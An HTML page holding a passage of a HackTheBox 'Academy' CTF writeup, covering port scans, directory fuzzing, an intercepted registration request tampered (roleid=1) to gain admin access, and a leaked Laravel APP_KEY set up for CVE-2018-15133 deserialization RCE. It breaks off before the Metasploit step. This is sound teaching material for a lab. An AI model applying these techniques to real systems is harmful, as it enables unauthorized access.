<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — Academy Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Academy Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer." /><meta property="og:description" content="Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer." /><link rel="canonical" href="http://localhost:4000/posts/Academy-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Academy-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Academy.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-03T12:30:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Academy.png" /><meta property="twitter:title" content="HackTheBox — Academy Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","headline":"HackTheBox — Academy Writeup","dateModified":"2021-03-03T12:30:00+05:30","description":"Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer.","datePublished":"2021-03-03T12:30:00+05:30","url":"http://localhost:4000/posts/Academy-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Academy-HTB/"},"image":"http://localhost:4000/assets/img/Posts/Academy.png","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — Academy Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Academy Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer." /><meta property="og:description" content="Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer." /><link rel="canonical" href="http://localhost:4000/posts/Academy-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Academy-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Academy.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-03T12:30:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Academy.png" /><meta property="twitter:title" content="HackTheBox — Academy Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","headline":"HackTheBox — Academy Writeup","dateModified":"2021-03-03T12:30:00+05:30","description":"Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer.","datePublished":"2021-03-03T12:30:00+05:30","url":"http://localhost:4000/posts/Academy-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Academy-HTB/"},"image":"http://localhost:4000/assets/img/Posts/Academy.png","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">b3t4m3</a></div><div class="site-subtitle font-italic">Ethical Hacker | CTF Player | Cybersecurity Specialist</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/bet4m3" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bet4m3" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['b3t4m3','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Academy Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Academy Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 3, 2021, 12:30 PM +0530" > Mar 3, 2021 <i class="unloaded">2021-03-03T12:30:00+05:30</i> </span> by <span class="author"> Carlos Sequeira </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Academy.png" class="post-preview-img"><blockquote><p>Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can register an admin account where we get access to Task dashboard. There we discover a new virtual host, which discloses a Laravel crash report with configuration details dump including APP_KEY. Leveraging this APP_KEY we create a serialized payload to be submitted in an HTTP header leading to code execution. Later we discover creds for the next user inside another Laravel configuration file, then analyse some audit logs where we find creds for another user, and lastly elevate privileges to root using sudo composer.</p></blockquote><h2 id="reconnaissance">Reconnaissance</h2><p>Starting off with <code class="language-plaintext highlighter-rouge">masscan</code> and <code class="language-plaintext highlighter-rouge">nmap</code> we discover three TCP open ports 22, 80, 33060</p><h4 id="masscan">masscan</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 <span class="nt">--rate</span> 500 10.10.10.215

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-08 13:29:57 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 22/tcp on 10.10.10.215
Discovered open port 80/tcp on 10.10.10.215
Discovered open port 33060/tcp on 10.10.10.215
</pre></table></code></div></div><h4 id="nmap">nmap</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80,33060 10.10.10.215
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-08 19:07 IST
Nmap scan report <span class="k">for </span>academy.htb <span class="o">(</span>10.10.10.215<span class="o">)</span>
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 <span class="o">(</span>RSA<span class="o">)</span>
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message<span class="s2">"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=11/8%Time=5FA7F4B1%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\</span>
SF:x08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOp
SF:tions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b
SF:<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVers
SF:ionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2
SF:B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fI
[..SNIP..]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.44 seconds
</span></pre></table></code></div></div><p>Port Scan Summary :</p><ul><li>Port 22 - SSH</li><li>Port 80 - HTTP Website</li><li>Port 33060 - Node.js X DevAPI’s default port</li></ul><h3 id="port-33060---mysqlx">Port 33060 - MySQLx</h3><p>Port 3306 defaults to the classic MySQL Wire Protocol. The MySQL X DevAPI Connector for Node.js only supports the X Protocol, which is implemented by the X Plugin (by default on port 33060). Since we are unsure how this port can be helpful, we’ll leave it as it is.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p>Visiting <a href="http://10.10.10.215">http://10.10.10.215</a> we see it’s redirected to <a href="http://academy.htb">http://academy.htb</a></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ curl <span class="nt">-v</span> http://10.10.10.215
<span class="k">*</span>   Trying 10.10.10.215:80...
<span class="k">*</span> Connected to 10.10.10.215 <span class="o">(</span>10.10.10.215<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.215
<span class="o">&gt;</span> User-Agent: curl/7.72.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 302 Found
&lt; Date: Sun, 08 Nov 2020 17:23:45 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Location: http://academy.htb/
&lt; Content-Length: 0
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt;
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.215 left intact</span>
</pre></table></code></div></div><p>After adding <code class="language-plaintext highlighter-rouge">academy.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and again visiting <a href="http://academy.htb">http://academy.htb</a> :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Academy/website.png" alt="website" /></p><p>Using the <code class="language-plaintext highlighter-rouge">REGISTER</code> option <a href="http://academy.htb/register.php">http://academy.htb/register.php</a> we are able to register a account and <code class="language-plaintext highlighter-rouge">LOGIN</code> <a href="http://academy.htb/login.php">http://academy.htb/login.php</a> to it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Academy/login.png" alt="login" /></p><p>Apparently the account is static coded, no matter what account we register we end up logged in as egre55. The homepage looks like a replica of HTB Academy except with all the dead links.</p><h4 id="directory-fuzzing">Directory Fuzzing</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://academy.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-e</span> .txt,.php <span class="nt">-fc</span> 403

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

login.php               [Status: 200, Size: 2627, Words: 667, Lines: 142]
admin.php               [Status: 200, Size: 2633, Words: 668, Lines: 142]
index.php               [Status: 200, Size: 2117, Words: 890, Lines: 77]
register.php            [Status: 200, Size: 3003, Words: 801, Lines: 149]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
home.php                [Status: 200, Size: 2627, Words: 667, Lines: 142]
.                       [Status: 200, Size: 2117, Words: 890, Lines: 77]
:: Progress: [129009/129009] :: Job [1/1] :: 484 req/sec :: Duration: [0:04:26] :: Errors: 0 ::
</span></pre></table></code></div></div><p>All the pages seems familiar except <code class="language-plaintext highlighter-rouge">admin.php</code>, Visiting <a href="http://academy.htb/admin.php">http://academy.htb/admin.php</a> we get presented with a similar login page but the credentials we registered don’t work.</p><h2 id="shell-as-www-data">Shell as www-data</h2><h3 id="admin-registration">Admin Registration</h3><p>Going back to the registration page and intercepting the request, we see some interesting parameters:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:78.0<span class="o">)</span> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>83vimjm1h2ri1ob61tvlbbcir7<span class="p">;</span> <span class="nv">ajs_anonymous_id</span><span class="o">=</span>%224b008a76-ac77-44e2-9dd4-14d11c35358d%22<span class="p">;</span> <span class="nv">_fbp</span><span class="o">=</span>fb.1.1604844176006.402584810
Upgrade-Insecure-Requests: 1

<span class="nv">uid</span><span class="o">=</span>cfx&amp;password<span class="o">=</span>cfx&amp;confirm<span class="o">=</span>cfx&amp;roleid<span class="o">=</span>0
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">uid</code> seems to represent username along with password and confirmation parameter. <code class="language-plaintext highlighter-rouge">roleid</code> is something unusual.</p><p>Next we register a new account, except this time we intercept the request with Burp and change the <code class="language-plaintext highlighter-rouge">roleid</code> value to 1, and forward the request:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:78.0<span class="o">)</span> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>83vimjm1h2ri1ob61tvlbbcir7<span class="p">;</span> <span class="nv">ajs_anonymous_id</span><span class="o">=</span>%224b008a76-ac77-44e2-9dd4-14d11c35358d%22<span class="p">;</span> <span class="nv">_fbp</span><span class="o">=</span>fb.1.1604844176006.402584810
Upgrade-Insecure-Requests: 1

<span class="nv">uid</span><span class="o">=</span>cold&amp;password<span class="o">=</span>cfx&amp;confirm<span class="o">=</span>cfx&amp;roleid<span class="o">=</span>1
</pre></table></code></div></div><p>Bingo ! The new account allows us to Admin log in at <a href="http://academy.htb/admin.php">http://academy.htb/admin.php</a> , once logged in we see a banner <code class="language-plaintext highlighter-rouge">Academy Launch Planner</code> :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Academy/admin.png" alt="admin" /></p><p>Seems like a TODO list, the last item gives us a new subdomain <code class="language-plaintext highlighter-rouge">dev-staging-01.academy.htb</code></p><h3 id="laravel-exploitation">Laravel Exploitation</h3><p>Adding the new subdomain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and visiting <a href="http://dev-staging-01.academy.htb">http://dev-staging-01.academy.htb</a> presents us with a page full of debugging errors:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Academy/dev.png" alt="dev" /></p><p>Looking at the error logs we understand it’s using Laravel framework.</p><h4 id="cve-2018-15133">CVE-2018-15133</h4><p>Searching for Laravel RCE we come across certain <a href="https://attackerkb.com/topics/G95JpYDkEZ/laravel-framework-unserialize-token-rce-cve-2018-15133"><strong>articles</strong></a> and a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/"><strong>exploit</strong></a> . It turns there is deserialization vulnerability in HTTP X-XSRF-TOKEN header, Surprisingly to exploit this vulnerability we require <code class="language-plaintext highlighter-rouge">Laravel APP_KEY</code></p><p>Luckily we do have this <code class="language-plaintext highlighter-rouge">APP_KEY</code> value leaked in the crash report:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Academy/app.png" alt="app" /></p><p><code class="language-plaintext highlighter-rouge">"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="</code></p><h3 id="method-1---msf">Method 1 - MSF</h3><p>Setting up the Metasploit exploit:</p><div 